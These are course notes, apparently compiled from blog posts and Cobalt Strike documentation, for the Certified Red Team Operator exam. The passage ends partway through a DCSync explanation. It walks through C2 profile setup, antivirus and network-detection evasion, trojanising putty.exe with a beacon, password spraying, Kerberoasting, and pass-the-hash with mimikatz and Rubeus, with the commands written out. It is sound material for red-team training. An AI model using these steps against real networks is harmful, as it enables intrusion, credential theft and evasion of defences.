---
id: ckb-82d948c8a3e5
title: Crto Notes to Exam Preparation
category: offensive-security
format: course-notes
language: en
tags: [active-directory, c2, certification, evasion, lateral-movement, red-team]
summary: This document provides study notes and lab resources for preparing for the Certified Red Team Operator exam, focusing on command and control frameworks like Cobalt Strike.
authors: [Joas Antonio Dos Santos]
license: NOASSERTION
added: 2026-10-04
classification:
  method: llm
  model: gemini-3.5-flash-lite
  confidence: 0.98
classified_by: google:gemini-3.5-flash-lite@2026-10-08T00:39:33Z
---

CRTO – Notes to Exam Preparation

https://www.linkedin.com/in/joas-antonio-
dos-santos

Sumário
Nenhuma entrada de sumário foi encontrada.

Laboratory
https://www.linkedin.com/posts/joas-antonio-dos-santos_ad-lab-by-ziyi-shen-activity-
6944759594069942272-Kevk?utm_source=share&utm_medium=member_desktop
https://robertscocca.medium.com/building-an-active-directory-lab-
82170dd73fb4
https://github.com/WazeHell/vulnerable-AD

https://blog.spookysec.net/ad-lab-1/

https://dev.to/adamkatora/building-an-active-directory-pentesting-home-lab-in-
virtualbox-53dc
https://www.libhunt.com/r/vulnerable-AD

https://systemweakness.com/active-directory-home-lab-w-powershell-2022-guide-
a87311182ab2
https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3y
zrqqHkDtBngUHNCw8/htmlview
https://htbmachines.github.io/
https://docs.google.com/spreadsheets/d/1dzvaGlT_0xnT-
PGO27Z_4prHgA8PHIpErmoWdlUrSoA/edit#gid=0

AD Lab Reviews https://github.com/ryan412/ADLabsReview

Command and Control
Command and control (C2) is often used by attackers to retain communications with
compromised systems within a target network.
They then issue commands and controls to compromised systems (as simple as a timed
beacon, or as involved as remote control or data mining). It's usually the compromised
system/host that initiates communication from inside a network to a command and control
server on the public internet. Establishing a command and control link is often the primary
objective of malware.

Cobalt Strike
Cobalt Strike is a platform for adversary simulations and red team operations. The product is
designed to execute targeted attacks and emulate the post-exploitation actions of advanced
threat actors. This section describes the attack process supported by Cobalt Strike’s feature
set. The rest of this manual discusses these features in detail.
Overview

The Offense Problem Set
A thought-out targeted attack begins with reconnaissance. Cobalt Strike’s system profiler is a
web application that maps your target’s client-side attack surface. The insights gleaned from
reconnaissance will help you understand which options have the best chance of success on
your target.
Weaponization is pairing a post-exploitation payload with a document or exploit that will
execute it on target. Cobalt Strike has options to turn common documents into weaponized
artifacts. Cobalt Strike also has options to export its post-exploitation payload, Beacon, in a
variety of formats for pairing with artifacts outside of this toolset.
Use Cobalt Strike’s spear phishing tool to deliver your weaponized document to one or more
people in your target’s network. Cobalt Strike’s phishing tool repurposes saved emails into
pixel- perfect phishes.
Control your target’s network with Cobalt Strike’s Beacon. This post-exploitation payload uses
an asynchronous “low and slow” communication pattern that’s common with advanced
threat malware. Beacon will phone home over DNS, HTTP, or HTTPS. Beacon walks through
common proxy configurations and calls home to multiple hosts to resist blocking.
Exercise your target’s attack attribution and analysis capability with Beacon’s Malleable
Command and Control language. Reprogram Beacon to use network indicators that look like
known malware or blend in with existing traffic.
Pivot into the compromised network, discover hosts, and move laterally with Beacon’s helpful
automation and peer-to-peer communication over named pipes and TCP sockets. Cobalt
Strike is optimized to capture trust relationships and enable lateral movement with captured
credentials, password hashes, access tokens, and Kerberos tickets.
Demonstrate meaningful business risk with Cobalt Strike’s user-exploitation tools. Cobalt
Strike’s workflows make it easy to deploy keystroke loggers and screenshot capture tools on
compromised systems. Use browser pivoting to gain access to websites that your
compromised target is logged onto with Internet Explorer. This Cobalt Strike-only technique
works with most sites and bypasses two-factor authentication.
Cobalt Strike’s reporting features reconstruct the engagement for your client. Provide the
network administrators an activity timeline so they may find attack indicators in their
sensors. Cobalt Strike generates high quality reports that you may present to your clients as
stand-alone products or use as appendices to your written narrative.
Throughout each of the above steps, you will need to understand the target environment, its
defenses, and reason about the best way to meet your objectives with what is available to you.
This is evasion. It is not Cobalt Strike’s goal to provide evasion out-of-the-box. Instead, the
product provides flexibility, both in its potential configurations and options to execute offense
actions, to allow you to adapt the product to your circumstance and objectives.

https://www.cobaltstrike.com/features/
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/
listener-infrastructue_external-c2.htm?cshid=1043
https://www.youtube.com/watch?v=q7VQeK533zI (Course)
Cobalt Strike Cheat Sheet https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
Beacon CS https://github.com/HarmJ0y/CheatSheets/blob/master/Beacon.pdf
C2 Profile
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/
malleable-c2_main.htm
The Cobalt Strike tool’s primary configuration is specified using a
profile file. The tool uses the values present in the profile to generate
the Beacon payload, and users create the profile and set its values
with a Malleable Command and Control (C2) profile language.
The profile specifies how the beacon will transform and store data in a
transaction.
Within a profile, options are divided into global options and local
options. Global options update the global Beacon settings, while local
options are transaction-specific. Local option changes within one
transaction do not affect the output from other transactions.
The profile is divided into multiple sections to specify the values for
different parts of the C2 communications. An example of a generic
structure of the profile is as follows:

1
2
3
4
5
6
7
8
9
10
# this is a comment
set global_option "value";

protocol-transaction {
    set local_option "value";

    client {
         # customize client indicators
    }

11
12
13
14
    server {
         # customize server indicators
    }
}
Different parts of the profile are explained below.
Global Options
Global options are global to C2 communications. Options such as
sleeptime and jitter define the frequency of Beacon’s check-in with the
team server. Here is a list of a few global options with example values:

1
2
3
4
5
set sample_name "Profile Name";
set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/55.0.2883.87 Safari/537.36";
set host_stage "false";
If you are interested in a more comprehensive list of all the global
options, refer to this Cobalt Strike user guide.
Local Options
On the other hand, the scope for local options is per transaction only.
The options for one transaction do not affect the other.
Examples of Local options:

1
2
3
4
set uri "URI_For HTTP transaction";
set verb "POST";
set uri_x86 "StagetURI_for_x86";
set uri_x64 "StagetURI_for_x64";
In addition to these options, a profile can specify different protocol-
transactions to carry out different actions. Below are example
transactions, as well as brief explanations of their usage:
• http-stager: The Beacon is a staged payload. The stager
downloads the file and injects it into memory. The values listed in
this transaction are customizing the HTTP communication for
downloading the beacon.
• dns-beacon: After Cobalt Strike v4.3, DNS options became part
of the dns-beacon transaction. This transaction modifies the
DNS C2 communication. If you are interested in a more
comprehensive list of all the dns-beacon options, refer to
this Cobalt Strike user guide.
• http-get: The http-get transaction customizes the HTTP
communication between the Beacon and the team server. The
Beacon starts by sending the HTTP request with metadata about
the compromised system. If the team server has tasks to
execute, the server sends an HTTP response.
• http-post: Once the Beacon executes the tasks sent by the
server, the output of the task is transferred in the http-
post transaction. The values listed in this transaction affect the
HTTP communication when the task output is sent over to the
server.
• https-certificate: If the Beacon is tasked to communicate over
HTTPS, The team server generates a self-signed certificate. The
team server uses http-get and http-post transaction values
to create actual HTTP requests and responses. This profile
transaction can help to specify the different parameters for SSL
certificates. If you are interested in a more comprehensive list of
all the http-certificates options, refer to this Cobalt Strike
user guide.
Cobalt Strike Default Profile
The default profile will be loaded if no other customized profiles are
specified. Figure 1, above, is the specification of the default profile, and
Figure 2, below, is an example of traffic capture from the default profile
using the web drive-by-download option in a Cobalt Strike team server.
Figure 2. An example traffic capture from the default profile.
From Figure 2, you can see that there are several HTTP transactions
of GET and POST requests and responses.
• For GET requests, most of the request URIs are very short and
have predefined patterns. The URIs are randomly chosen from
the list of URIs specified under set uri in the default profile in
Figure 1 (see Table 1 below for the complete list). Malicious
attackers can easily modify the URI to arbitrary strings if they use
a customized profile with set uri options inside the http-
get section. This also explains why a pattern-based signature
might catch the Cobalt Strike traffic using default profiles very
well, but fail to capture any variations with customized profiles.
• For POST requests, there is a predefined pattern
– /submit.php?id= – in the URI. The ID value is randomly
generated. Similar to the possibilities for HTTP GET requests,
malicious attackers can easily modify the URIs to arbitrary
strings if they use customized profiles with set uri options
inside the http-post section.
https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/
Artifact KIT
Payload Artifacts and Anti-virus Evasion
HelpSystems regularly fields questions about evasion. Does Cobalt Strike bypass anti-virus
products? Which anti-virus products does it bypass? How often is this checked?
The Cobalt Strike default artifacts will likely be snagged by most endpoint security solutions.
Although evasion is not a goal of the default Cobalt Strike product, Cobalt Strike does offer
some flexibility.
You, the operator, may change the executables, DLLs, applets, and script templates Cobalt
Strike uses in its workflows. You may also export Cobalt Strike’s Beacon payload in a variety of
formats that work with third-party tools designed to assist with evasion.
This chapter highlights the Cobalt Strike features that provide this flexibility.
 https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics
/artifacts-antivirus_main.htm
https://www.youtube.com/watch?v=mZyMs2PP38w
https://www.youtube.com/watch?v=6mC21kviwG4
https://www.youtube.com/watch?v=Z-vI3bPEFAY
https://br-sn.github.io/

Exploitation
MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange
environment for specific terms (passwords, insider intel, network architecture information,
etc.). It can be used as a non-administrative user to search their own email or by an Exchange
administrator to search the mailboxes of every user in a domain.
MailSniper also includes additional modules for password spraying, enumerating users and
domains, gathering the Global Address List (GAL) from OWA and EWS and checking mailbox
permissions for every Exchange user at an organization.
https://github.com/dafthack/MailSniper
Invoke-DomainHarvestOWA will attempt to connect to an OWA portal and determine a valid
domain name for logging into the portal from the WWW-Authenticate header returned in a
web response from the server or based off of small timing differences in login attempts.
Password Spray
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack
against users of a domain. By default it will automatically generate the userlist from the
domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!
https://github.com/dafthack/DomainPasswordSpray
Get password policy
If you have some user credentials or a shell as a domain user you can get the password policy
with:
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
enum4linx -u 'username' -p 'password' -P <IP>
rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo
ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10
pwdHistoryLength
# From Windows
net accounts
(Get-DomainPolicy)."SystemAccess" #From powerview
•
With Rubeus version with brute module:
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file>
/domain:<domain_name> /outfile:<output_file>
# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
•
With Invoke-DomainPasswordSpray (It can generate users from the domain by default
and it will get the password policy from the domain and limit tries according to it):
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
•
With Invoke-SprayEmptyPassword.ps1
Invoke-SprayEmptyPassword
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-
abuse/active-directory-password-spraying
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-
spraying
Spear Phishing
Now that you have an understanding of client-side attacks, let’s talk about how to get the
attack to the user. The most common way into an organization’s network is through spear
phishing. Cobalt Strike's spear phishing tool allows you to send pixel perfect spear phishing
messages using an arbitrary message as a template.
Targets
Before you send a phishing message, you should assemble a list of targets. Cobalt Strike
expects targets in a text file. Each line of the file contains one target. The target may be an
email address. You may also use an email address, a tab, and a name. If provided, a name
helps Cobalt Strike customize each phish.
Templates
Next, you need a phishing template. The nice thing about templates is that you may reuse
them between engagements. Cobalt Strike uses saved email messages as its templates. Cobalt
Strike will strip attachments, deal with encoding issues, and rewrite each template for each
phishing attack.
If you’d like to create a custom template, compose a message and send it to yourself. Most
email clients have a way to get the original message source. In Gmail, click the down arrow
next to Reply and select Show original. Save this message to a file and then congratulate
yourself— you’ve made your first Cobalt Strike phishing template.
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/
init-access_spear-phishing.htm
https://duo.com/decipher/phishing-attack-targets-microsoft-office-rce-flaw-to-deliver-cobalt-
strike
https://www.youtube.com/watch?v=oByOp-QCL5o
HTA Phishing
An HTML Application (HTA) is a Microsoft Windows program whose source consists of HTML,
Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as
VBScript or JScript.
In this example we will be assuming that attachments are not allowed in our Emails, so we will
need to send a user a Direct link where we will bypass the email attachment and directly
download our Binary(HTA), in the following we will use Empire Framework to create our
malicious binary. This attack can also be considered an attachment but here an HTA file is
being downloaded and executed.
Empire is a post-exploitation framework that includes a pure Powershell2.0 Windows agent,
and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire
and Python EmPyre projects. Empire implements the ability to run Powershell agents without
the need of powershell.exe, rapidly deployable post-exploitation modules from keyloggers to
evade network detection PowerShell premiered at BSides in 2015.
https://dmcxblue.gitbook.io/red-team-notes/initial-acces/spear-phishing-links/tools
https://academy.tcm-sec.com/courses/1444641/lectures/33152686
Cobalt Strike and Veil Evasion
The Veil Framework is a collection of  red team tools, focused on evading detection. The Veil
Evasion project is a tool to generate artifacts that get past anti-virus. It’s worth getting to know
Veil. It has a lot of capability built into it.
Cobalt Strike 2.0’s Payload Generator includes an option to output a Cobalt Strike payload in a
format that’s Veil-ready. Go to Attacks -> Packages -> Payload Generator to open it. Choose
your listener and set veil as the output type. Save the file it generates.

Now, go to Veil and choose the type of artifact you want to create. Veil will ask if you want to
use msfvenom or supply your own shellcode. Select the option to supply your own shellcode.
Paste in the contents of the veil file made by Cobalt Strike. Congratulations–you have made a
Veil artifact with a Cobalt Strike payload.

https://www.cobaltstrike.com/blog/use-cobalt-strikes-beacon-with-veils-evasion/
https://github.com/Veil-Framework/Veil-Evasion/blob/master/tools/cortana/veil_evasion.cna
Memory Evasion
Many analysts and automated solutions take advantage of various memory detections to find
injected DLLs in memory. Memory detections look at the properties (and content) of
processes, threads, and memory to find indicators of malicious activity in the current process.
In-memory Evasion is a four-part mini course on the cat and mouse game related to memory
detections. This course is for red teams that want to update their tradecraft in this area. It’s
also for blue teams that want to understand the red perspective on these techniques. Why do
they work in some situations? How is it possible to work around these heuristics in other
cases?
https://www.cobaltstrike.com/blog/in-memory-evasion/
Other Evasion Techniques
https://www.youtube.com/watch?v=0hV8DbJSRR4
https://rioasmara.com/2021/05/30/veil-evasion-in-cobalt-strike-beacon/
https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-
classic-c-shellcode-launcher-with-1-byte-change
https://kylemistele.medium.com/a-beginners-guide-to-edr-evasion-b98cc076eb9a
https://capturethetalent.co.uk/windows-defender-evasion-meterpreter-session-to-cobalt-
strike-beacon/
https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encoding-decoding/
https://0xsp.com/security%20research%20%20development%20srd/defeat-the-castle-bypass-
av-advanced-xdr-solutions/
AMSI Bypass
Cobalt Strike Beacon Object File (BOF) that bypasses AMSI in a remote process with code
injection.
https://github.com/boku7/injectAmsiBypass
https://www.youtube.com/watch?v=rS55paVNaKQ
https://offensivedefence.co.uk/posts/making-amsi-jump/
https://www.x33fcon.com/slides/x33fcon20_Dominic_Chell_-
_Offensive_Development__Post_Exploitation_Tradecraft_in_an_EDR_World.pdf
https://book.hacktricks.xyz/c2/cobalt-strike?q=kubeletctr
https://gist.github.com/tothi/8abd2de8f4948af57aa2d027f9e59efe
Threat Check
Takes a binary as input (either from a file on disk or a URL), splits it until it pinpoints that exact
bytes that the target engine will flag on and prints them to the screen. This can be helpful
when trying to identify the specific bad pieces of code in your tool/payload.

https://github.com/rasta-mouse/ThreatCheck
Bypass Network Connection
Luckily Cobalt Strike Malleable C2 profiles are highly customisable. In fact, customisation is one
of the reasons why Cobalt Strike is so popular and also so effective. You could write your own
profile and there are some guides online that show you how to do this.

However, there is an easier way, C2 Concealer. The tool, created by FortyNorth Security, was
released last year and features a Python Script which will generate a C2 Profile based on a few
variables defined by the user.
Demo
Installation is easy, just clone the GitHub repo, and run the install script.
Once the install is complete, run the script and define a hostname you wish to use.
1
C2concealer --hostname newtpaul.com  --variant
1
Next, C2Concealer will scan your host to locate where c2lint is located. C2lint is a tool included
with CobaltStrike which is used to test/troubleshoot profiles before they’re used.

Once the scanning is finished, you’ll be asked to choose an SSL option. Using a legit LetsEncrypt
cert is obviously going to be the most effective at avoiding detection. However, that requires
you to point the A record at your team sever. For the purposes of this, we’ll just use a self-
signed cert.

You’ll be asked to fill out some basic information for the cert. It doesn’t matter too much what
you put here.
Once it’s complete you should receive confirmation that the profile has passed the c2lint
check. The name of the newly created profile will also be displayed.

Next, launch your team server, but this time defining the profile to load.
1
sudo ./teamserver 192.168.1.21 *Password*
~/C2concealer/C2concealer/34c5a462.profile
Generate a new listener and a new payload of your choice.
Before VS After
Before using our newly created profile, SEP blocked outbound connections to our Cobalt Strike
team server. This was when using just the default C2 profile.

However, after using our newly created profile, nothing was blocked and we were able to
successfully establish a C2.

https://newtonpaul.com/cobalt-strike-bypassing-c2-network-detections/
Shellter beacon cobalt strike
Generate Cobalt Raw Payload
First, we need to generate cobalt raw payload. but please remember that Shellter only support
upto 250 kilobytes payload. We can only use payload with stager. Generating cobalt strike raw
payload steps follow below

Select the listener that you want to use, Select output is Raw.

Save your raw payload into a file.
Shellter Operation
The steps below are to embed the cobalt payload into the existing executable. I am going to
show you straightforward steps with auto mode to embed the payload. Please remember that
these steps will make your payload easier to be detected. You can do some manual steps for
better evasion
Follow the steps below to embed the cobalt strike beacon into an executable. I am using 32 bit
putty.exe as the payload host.

Select A for Auto

Select N for No

Type putty.exe

Select Y for stealth mode

Select C for Custom payload that will point to your cobalt strike raw payload

input your cobalt strike myPayload.bin

Select N for No.

That is all.
When putty.exe is executed, the payload will directly run the payload. We can see here below
the beacon is successfully contacting the server.
https://rioasmara.com/2021/06/12/cobalt-strike-beacon-with-shellter/
Rubeus Cobalt Strike
Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted
from Benjamin Delpy's Kekeo project (CC BY-NC-SA 4.0 license) and Vincent LE
TOUX's MakeMeEnterpriseAdmin project (GPL v3.0 license). Full credit goes to Benjamin and
Vincent for working out the hard components of weaponization- without their prior work this
project would not exist.
Opsec Notes
This section covers some notes on the operational security of using Rubeus in an environment,
with some technical examples comparing/contrasting some of its approaches to Mimikatz. The
material here will be expanded in the future.
Overview
Any action you perform on a system is a detectable risk, especially when abusing functionality
in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of
methods, either from the host, network, or domain perspectives. I have a workmate who is
fond of stating "everything is stealthy until someone is looking for it" - tools and techniques
generally evade detection because either a) people are not sufficiently aware of the
tool/technique and therefore not even looking, b) people can not collect and process the data
needed at the appropriate scale, or c) the tool/technique blends with existing behavior to
sufficiently sneak in with false positives in an environment. There is much more information on
these steps and detection subversion in general in Matt Graeber and Lee Christensen’s Black
Hat USA 2018 “Subverting Sysmon” talk and associated whitepaper.
From the host perspective, Rubeus can be caught during initial weaponization of the code
itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the
use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present
on the host (e.g. rc4_hmac use in tickets in a modern environment).
From a network or domain controller log perspective, since Rubeus implements many parts of
the normal Kerberos protocol, the main detection method involves the use of rc4_hmac in
Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES
encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm
trust tickets). Using a rc4_hmac (NTLM) hash is used in a Kerberos exchange instead of a
aes256_cts_hmac_sha1 (or aes128) key results in some signal that is detectable at the host
level, network level (if Kerberos traffic is parsed), and domain controller event log level,
sometimes known as "encryption downgrade".
Weaponization
One common way attack tools are detected is through the weaponization vector for the code.
If Rubeus is run through PowerShell (this includes Empire) the standard PowerShell V5
protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary
on disk, standard AV signature detection comes into play (part of why we do not
release compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as
a library then it's susceptible to whatever method the primary tool uses to get running. And if
Rubeus is run through unmanaged assembly execution (like Cobalt Strike's execute_assembly)
cross-process code injection is performed and the CLR is loaded into a potentially non-.NET
process, though this signal is present for the execution of any .NET code using this method.
Also, AMSI (the Antimalware Scan Interface) has been added to .NET 4.8. Ryan Cobb has
additional details on the offensive implications of this in the Defense section of his “Entering a
Covenant: .NET Command and Control” post.
Example: Credential Extraction
Say we have elevated access on a machine and want to extract user credentials for reuse.
Mimikatz is the swiss army knife of credential extraction, with multiple options.
The sekurlsa::logonpasswords command will open up a read handle to LSASS, enumerate logon
sessions present on the system, walk the default authentication packages for each logon
session, and extract any reverseable password/credential material present. Sidenote:
the sekurlsa::ekeys command will enumerate ALL key types present for the Kerberos package.
Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is
limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API.
From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so
only service tickets extracted will be usable (the tgtdeleg command uses a Kekeo trick to get a
usable TGT for the current user). If in a high-integrity context, a GetSystem equivalent utilizing
token duplication is run to elevate to SYSTEM, and a fake logon application is registered with
the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction
of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's
being output for later reuse.
https://github.com/GhostPack/Rubeus
https://specterops.gitbook.io/ghostpack/rubeus/introduction/opsec-notes
Same with Rubeus (must be in elevated context):
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local
/aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap
/opsec /createnetonly:C:\Windows\System32\cmd.exe
beacon> steal_token 1337
To get Rubeus you will actually need Visual Studio 2017 or anything that can compile .NET. In
my case I use Visual Studio and build myself an assembly. Luckily at the moment the default
build of Rubeus is only detected by one AV vendor on Virus Total however if your AV is flagging
it just change some strings and comments and rebuild the project and your AV will shut up.
That’s the beauty of open-source C# / .NET Projects, much easier to circumvent anti-virus
solutions.
Armed with out assembly/exe we can simply drop it on the target Domain-Joined Machine in
the context of a domain user and start Roasting.
Rubeus Github has an amazing explanation on all it’s features and it’s ability to target
specific OU's Users etc etc so I will try not to copy it word-for-word but merely show it’s
capabilities.
First we can try to Roast all Users in the Current Domain (May be Noise)
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast
Kerberoast All Users in a Specific OU (Good if Organization has all Service Accounts in a Specific
OU)
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast
/ou:OU=SerivceAcc,DC=m0chanAD,DC=local
This may generate a lot of Output so we can Output all the Hashes to a file for easier
Management and Cracking.
/outfile:C:\Temp\TotallyNotHashes.txt
Roasting a Specific Users or SPN
PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /user:mssqlservice

PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /spn:MSSQLSvc/SQL.m0chanAD.local
There is also the ability to Roast users in a foreign trust domain providing the trust
relationships allow you but you can check out the Rubeus Repo for full explanation on that. It’s
really cool.
https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#rubeus

Windows Access Token
I’d like to call your attention to the humble runas.exe program on Windows. This program
allows a Windows user to spawn another program with another user’s credentials.

It’s a little painful to use runas.exe from a remote access tool. This program doesn’t accept a
password as an argument. Cobalt Strike’s Beacon has a built-in runas command to give you
similar functionality.
The process that runas starts has an access token populated with the same single sign-on
information you would expect from access tokens made by a normal login. You can steal a
token from a program started by runas and use that token to interact with local and remote
resources.
The runas capability is great for situations where you want to create a process as a local user
on the current system or as a domain user from a trusted domain. This covers a lot of
situations, but not all.
What happens if you need to interact with a remote resource as a local user on another
system? How do you interact with a remote resource as a domain user when there’s no trust
relationship with that domain? These problems have a solution.
The Curious /NETONLY Flag
The runas program has a /NETONLY flag. This flag tells runas that the specified credentials are
for remote access only. Windows will not try to validate these credentials. Instead, Windows
will create a copy of your current access token and update it to use the new credentials when
Windows interacts with a remote resource. Windows will then create the new process with
this doctored token.
This has a curious effect. The new program is run as the current user. On the current system,
there is no change in your rights, permissions, or identity. But, when you interact with a
remote resource, you are the specified user.

Logon Sessions and other Access Token Trivia
I hope I’ve raised some questions so far. Questions like, how does runas.exe /NETONLY work?
Windows manages identity and security information in a structure known as an Access Token.
These data structures contain things like: your username, groups, privileges, and other
information. An Access Token may also contain information to restrict your rights. When
working with Windows, it’s important to understand that an access token isn’t a single thing
that represents a user’s identity. An access token is an instantiation of an identity with a lot of
variables thrown in.
An easy example of this is User Account Control. A local administrator user may run most
processes in a medium integrity context. The tokens associated with their processes have an
Integrity level field set to 0x2000 which is SECURITY_MANDATORY_MEDIUM_RID. Processes
run by the same local administrator in a high integrity context have access tokens with their
Integrity level set to 0x3000. These tokens represent the same user, but different rights. The
point here is that Windows may have multiple access tokens, with different configurations, for
a user and that’s normal.
This blog post isn’t a deep dive into access tokens though. It’s a walk down the garden path
about single sign-on information. Let’s jump into that.
An Access Token contains your identity on the current system and it states what you can and
can’t do on the current system. An Access Token also references the information Windows
uses to automatically authenticate to remote systems.
Now I hope you’re asking: what part of an Access Token determines who you are on a remote
system? This question is the whole point of this blog post.
Each Access Token references a Logon Session. The Logon Session references credential
material for single sign-on purposes. When Windows authenticates to a remote system, it uses
the Logon Session’s credential material to authenticate. A Logon Session is made after
authentication is successful. Logon Sessions go away when there are no more tokens that
reference them.
When you use the /NETONLY flag with runas.exe, Windows will create a new Logon Session
with the credential material you provide. It will then copy your current token and substitute
the default logon session for the new one. The specified program is then run with this new
token.
The program run by runas looks like it’s running as your current user. That’s because it is. The
new program was run with a copy of your user’s access token! When you interact with a
network resource, Windows does not authenticate as your Access Token’s user. Windows uses
the credential information referred to by the new Logon Session. In this case, the credential
material in this new Logon Session does not necessarily match the identity in your current
Access Token.
If you’d like to see a list of Logon Sessions on your current system, take a look at
the logonsessions utility by Mark Russinovich.

Implications for Beacon Users
Beacon’s runas command is similar to the default behavior of the runas program built into
Windows. What about the /NETONLY flag? Beacon has something like this too. It’s the
make_token command.
The make_token command uses the LogonUser function in Windows with the
LOGON32_LOGON_NEW_CREDENTIALS flag. This API creates a Logon Session from the
specified credentials, copies your Access Token, associates the new Logon Session with the
new Access Token, and makes this new Access Token available. Beacon then impersonates this
new token.
What’s the effect of this? You have a new token that is locally indistinguishable from your
previous token. When you use Beacon’s getuid command to query your token’s identity, you
get back the current user. When you type shell whoami, you get back the current user.
What happens when you interact with a network resource? Windows authenticates with the
credentials you specified to make_token. Why? Because the Logon Session in the current
Access Token references the credentials you provided to make_token. In this case, the Logon
Session information does not match the local identity of your current token.
The make_token command in Beacon works this way to allow you to use a local account from
another system to interact with it. This mechanism also allows you to authenticate to a system
as a domain user when there’s no trust relationship with that domain.
The pth command in Beacon is a similar story. The pth command asks mimikatz to: (1) create a
new Logon Session, (2) update the credential material in that Logon Session with the domain,
username, and password hash you provided, and (3) copy your Access Token and make the
copy refer to the new Logon Session. Beacon then impersonates the token made by these
steps and you’re ready to pass-the-hash.
https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials/
https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation
https://www.youtube.com/watch?v=QF_6zFLmLn0
Mimikatz Cobalt Strike
I’m spending a lot of time with mimikatz lately. I’m fascinated by how much capability it has
and I’m constantly asking myself, what’s the best way to use this during a red team
engagement?
A hidden gem in mimikatz is its ability to create a trust relationship from a username and
password hash. Here’s the mimikatz command to do this:
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
The sekurlsa:pth command requires local administrator privileges. This command spawns the
process you specify and modifies its access token. The local Windows system will still think the
process was run by your current user. The parts of the token designed to support single sign-
on will reference the username, domain, and password hash you provide.
If you use the above to spawn another payload (e.g., Meterpreter, Beacon); your actions that
attempt to interact with a remote network resource will use the username, domain, and
password hash you provide to authenticate.
In practice, spawning a new payload to pass-the-hash is a pain. It’s much easier to spawn a
bogus process (e.g., calc.exe) and steal its token. Beacon’s steal_token command will
impersonate a token from another process. The token stolen from our bogus process will
continue to reference the username, domain, and password hash you provide. Any actions to
interact with a remote resource, while Beacon holds this token, will pass the hash for us.
Let’s assume I have a foothold in a target environment and I’ve elevated my privileges. Here’s
how I’d use this for lateral movement with Beacon:
1) Run hashdump to dump password hashes for the local users.

2) Run mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:”powershell -w
hidden”

We do powershell -w hidden to create a process without putting a Window on the desktop.
Mimikatz doesn’t hide Windows for the processes it creates.
3) Use steal_token 1234 to steal the token from the PID created by mimikatz

4) Use shell dir \\TARGET\C$ to check for local admin rights

5) Try one of the lateral movement recipes (wmic, sc, schtasks, at) from this blog post to take
control of the system.

https://www.cobaltstrike.com/blog/how-to-pass-the-hash-with-mimikatz/
https://www.youtube.com/watch?v=GmrPHD7k7W0
https://support.alertlogic.com/hc/en-us/articles/360006720392-Windows-Mimikatz-Lateral-
Movement-Privilege-Escalation
https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
A major feature added to Mimkatz in August 2015 is “DCSync” which effectively
“impersonates” a Domain Controller and requests account password data from the targeted
Domain Controller. DCSync was written by Benjamin Delpy and Vincent Le Toux.
The exploit method prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a Domain
Controller to get the KRBTGT password hash to create Golden Tickets. With Mimikatz’s DCSync
and the appropriate rights, the attacker can pull the password hash, as well as previous
password hashes, from a Domain Controller over the network without requiring interactive
logon or copying off the Active Directory database file (ntds.dit).
Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or
Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to
pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password
data for users by default.

The credentials section in the graphic above shows the current NTLM hashes as well as the
password history. This information can be valuable to an attacker since it can provide
password creation strategies for users (if cracked).
Will’s post has great information on Red Team usage of Mimikatz DCSync:
Mimikatz and DCSync and ExtraSids, Oh My

How DCSync works:
1. Discovers Domain Controller in the specified domain name.
2. Requests the Domain Controller replicate the user credentials
